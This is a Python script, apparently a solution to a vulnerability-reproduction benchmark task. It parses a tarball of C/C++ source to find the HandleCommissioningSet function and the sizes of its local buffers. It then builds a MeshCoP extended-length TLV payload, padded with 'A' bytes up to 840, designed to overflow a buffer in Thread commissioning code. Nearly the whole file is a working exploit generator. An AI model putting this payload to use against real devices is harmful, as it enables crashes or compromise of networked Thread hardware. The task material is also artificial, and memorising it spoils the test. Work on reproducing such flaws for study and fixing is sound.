import io
import os
import re
import tarfile
from typing import Dict, Iterable, Optional, Tuple


class Solution:
    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, str]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".ipp", ".inc")
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                if not name.lower().endswith(exts):
                    continue
                if m.size <= 0 or m.size > 5_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                yield name, text

    def _parse_int(self, s: str) -> Optional[int]:
        s = s.strip()
        if not s:
            return None
        try:
            if s.lower().startswith("0x"):
                return int(s, 16)
            return int(s, 10)
        except Exception:
            return None

    def _build_symbol_table(self, tar_path: str) -> Dict[str, int]:
        sym: Dict[str, int] = {}

        re_define = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+([0-9]+|0x[0-9a-fA-F]+)\b", re.M)
        re_enum = re.compile(r"\b([kK][A-Za-z0-9_]*)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b")
        re_constexpr = re.compile(
            r"\b(?:static\s+)?(?:constexpr|const)\s+[A-Za-z_][\w:<>]*\s+([kK][A-Za-z0-9_]*)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b"
        )

        for _, text in self._iter_source_files_from_tar(tar_path):
            for m in re_define.finditer(text):
                name, val = m.group(1), m.group(2)
                iv = self._parse_int(val)
                if iv is not None and name not in sym:
                    sym[name] = iv
            for m in re_constexpr.finditer(text):
                name, val = m.group(1), m.group(2)
                iv = self._parse_int(val)
                if iv is not None and name not in sym:
                    sym[name] = iv
            for m in re_enum.finditer(text):
                name, val = m.group(1), m.group(2)
                iv = self._parse_int(val)
                if iv is not None and name not in sym:
                    sym[name] = iv

        return sym

    def _find_handle_commissioning_set_body(self, tar_path: str) -> Optional[str]:
        # Return the function body string including braces, if found.
        sig_re = re.compile(r"\bHandleCommissioningSet\s*\(", re.M)
        for _, text in self._iter_source_files_from_tar(tar_path):
            m = sig_re.search(text)
            if not m:
                continue
            start = m.start()
            # Find opening brace after signature
            brace_pos = text.find("{", m.end())
            if brace_pos == -1:
                continue
            # Quick guard: ensure it's likely a function definition, not a declaration
            semi_pos = text.find(";", m.end(), brace_pos + 1)
            if semi_pos != -1:
                # Might still be definition with templates/macros; continue searching in this file
                pass

            depth = 0
            i = brace_pos
            n = len(text)
            while i < n:
                c = text[i]
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                    if depth == 0:
                        return text[brace_pos : i + 1]
                i += 1
        return None

    def _safe_eval_expr(self, expr: str, sym: Dict[str, int]) -> Optional[int]:
        # Very small evaluator for expressions like "kFoo", "16", "kFoo + 1", "4 * kBar"
        expr = expr.strip()
        if not expr:
            return None

        # Replace sizeof(...) with unknown
        if "sizeof" in expr:
            return None

        # Tokenize identifiers and substitute if known
        def repl_ident(m):
            name = m.group(0)
            if name in sym:
                return str(sym[name])
            return name

        expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_ident, expr)

        # Reject if any unknown identifiers remain
        if re.search(r"\b[A-Za-z_]\w*\b", expr2):
            return None

        # Allow only safe chars
        if re.search(r"[^0-9xXa-fA-F\(\)\+\-\*\/%<>&\|\^~\s]", expr2):
            return None

        # Parse and evaluate using Python eval with no builtins
        try:
            val = eval(expr2, {"__builtins__": None}, {})
        except Exception:
            return None
        if isinstance(val, bool):
            val = int(val)
        if not isinstance(val, int):
            return None
        if val < 0 or val > 1_000_000:
            return None
        return val

    def _infer_overflow_length(self, tar_path: str, sym: Dict[str, int]) -> int:
        body = self._find_handle_commissioning_set_body(tar_path)
        if not body:
            return 840

        # Find local arrays and their sizes
        array_re = re.compile(
            r"\b(?:uint8_t|int8_t|char|unsigned\s+char|signed\s+char|uint16_t|uint32_t|uint64_t)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+?)\s*\]\s*;"
        )
        arrays: Dict[str, int] = {}
        for m in array_re.finditer(body):
            name = m.group(1)
            expr = m.group(2)
            size = self._safe_eval_expr(expr, sym)
            if size is None:
                continue
            if 0 < size <= 65535:
                arrays[name] = size

        # Find memcpy/memmove destinations used in this function
        dests = set()
        for mm in re.finditer(r"\bmem(?:cpy|move)\s*\(\s*([A-Za-z_]\w*)\s*,", body):
            dests.add(mm.group(1))
        for mm in re.finditer(r"\b(?:CopyBytes|memcpy_s)\s*\(\s*([A-Za-z_]\w*)\s*,", body):
            dests.add(mm.group(1))

        candidate_sizes = []
        for d in dests:
            if d in arrays:
                candidate_sizes.append(arrays[d])

        # Also consider any obvious max constants referenced in the function body
        for cname in set(re.findall(r"\b(kMax[A-Za-z0-9_]+)\b", body)):
            if cname in sym:
                v = sym[cname]
                if 16 <= v <= 4096:
                    candidate_sizes.append(v)

        if candidate_sizes:
            buf_size = min(candidate_sizes)
            # Ensure extended-length is used and big enough to overflow
            overflow_len = buf_size + 1
            # Cap to reasonable size; keep within typical message limits, but still likely to overflow
            if overflow_len < 64:
                overflow_len = 64
            if overflow_len > 840:
                overflow_len = 840
            return overflow_len

        return 840

    def _infer_tlv_type(self, sym: Dict[str, int]) -> int:
        # Prefer CommissionerId, then SteeringData, else fallback.
        for k in ("kCommissionerId", "kCommissionerID", "kCommissionerIdTlv", "kTlvCommissionerId"):
            if k in sym and 0 <= sym[k] <= 255:
                return sym[k]
        for k in ("kSteeringData", "kTlvSteeringData"):
            if k in sym and 0 <= sym[k] <= 255:
                return sym[k]
        # Common Thread MeshCoP Commissioner ID TLV type is 10 (0x0A)
        return 0x0A

    def solve(self, src_path: str) -> bytes:
        # src_path points to the vulnerable source code tarball
        sym = self._build_symbol_table(src_path)
        tlv_type = self._infer_tlv_type(sym)
        val_len = self._infer_overflow_length(src_path, sym)

        if val_len < 1:
            val_len = 840
        if val_len > 65535:
            val_len = 840

        # MeshCoP extended-length TLV: Type(1) Length(1=0xFF) ExtendedLength(2 big-endian) Value(N)
        payload = bytearray()
        payload.append(tlv_type & 0xFF)
        payload.append(0xFF)
        payload += int(val_len).to_bytes(2, "big", signed=False)
        payload += b"A" * val_len
        return bytes(payload)